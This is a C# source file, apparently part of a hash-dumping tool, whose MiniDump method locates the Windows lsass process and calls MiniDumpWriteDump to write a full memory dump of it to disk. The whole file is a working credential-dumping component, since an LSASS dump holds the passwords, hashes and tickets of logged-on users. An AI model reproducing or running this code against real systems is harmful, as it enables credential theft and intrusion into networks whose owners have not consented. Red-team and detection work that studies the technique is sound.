using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.IO;
using System.Diagnostics;

internal class DumpMemory
{
    public static string MiniDump()
    {


        Process[] pLsass = Process.GetProcessesByName("lsass");
        string dumpFile = Path.Combine(dumphash.ResultPath, string.Format("{0}lsass.dmp", pLsass[0].Id));
        if (File.Exists(dumpFile)) File.Delete(dumpFile);
        //Console.WriteLine(String.Format("[*] Dumping lsass(pid:{0}) to {1}", pLsass[0].Id, dumpFile));
        using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
        {
            bool bRet = MiniDumpWriteDump(pLsass[0].Handle, (uint)pLsass[0].Id,
            fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (bRet)
            {
                Console.WriteLine("[+] Dump lsass successful!");
                return dumpFile;
            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump Lsass Failed! ErrorCode: {0}", Marshal.GetLastWin32Error()));
                return null;
            }
        }

    }

    [DllImport("dbghelp.dll",
            EntryPoint = "MiniDumpWriteDump",
            CallingConvention = CallingConvention.Winapi,
            CharSet = CharSet.Unicode,
            ExactSpelling = true,
            SetLastError = true)]
    private static extern bool MiniDumpWriteDump(IntPtr hProcess,
            uint processId,
            SafeHandle hFile,
            uint dumpType,
            IntPtr expParam,
            IntPtr userStreamParam,
            IntPtr callbackParam);
}
